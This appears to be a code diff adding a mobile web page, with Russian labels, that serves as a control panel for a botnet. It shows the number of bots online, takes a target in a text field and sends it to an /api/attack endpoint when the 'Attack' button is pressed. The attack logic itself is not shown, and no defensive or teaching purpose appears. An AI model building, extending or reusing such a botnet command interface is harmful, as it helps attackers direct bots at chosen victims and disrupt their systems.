@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>AVZ-Aristo Mobile</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="manifest" href="manifest.json">
+    <style>
+        body { font-family: sans-serif; background: #f5f5f5; margin:0; padding:10px; }
+        .card { background: white; padding:15px; margin:10px 0; border-radius:8px; box-shadow:0 2px 4px rgba(0,0,0,0.1); }
+        button { padding:10px 20px; background: #0077ff; color:white; border:none; border-radius:5px; }
+    </style>
+</head>
+<body>
+    <h2>AVZ-Aristo</h2>
+    <div class="card">
+        <h3>Боты онлайн: <span id="botsCount">...</span></h3>
+        <button onclick="fetchStats()">Обновить</button>
+    </div>
+    <div class="card">
+        <input type="text" id="target" placeholder="Цель" style="width:100%;padding:10px;">
+        <button onclick="startAttack()">Атаковать</button>
+    </div>
+    <script>
+        async function fetchStats() {
+            const res = await fetch('/api/stats');
+            const data = await res.json();
+            document.getElementById('botsCount').innerText = data.bots;
+        }
+        async function startAttack() {
+            const target = document.getElementById('target').value;
+            await fetch('/api/attack', {method:'POST', body:JSON.stringify({target}), headers:{'Content-Type':'application/json'}});
+            alert('Атака запущена');
+        }
+        fetchStats();
+    </script>
+</body>
+</html>
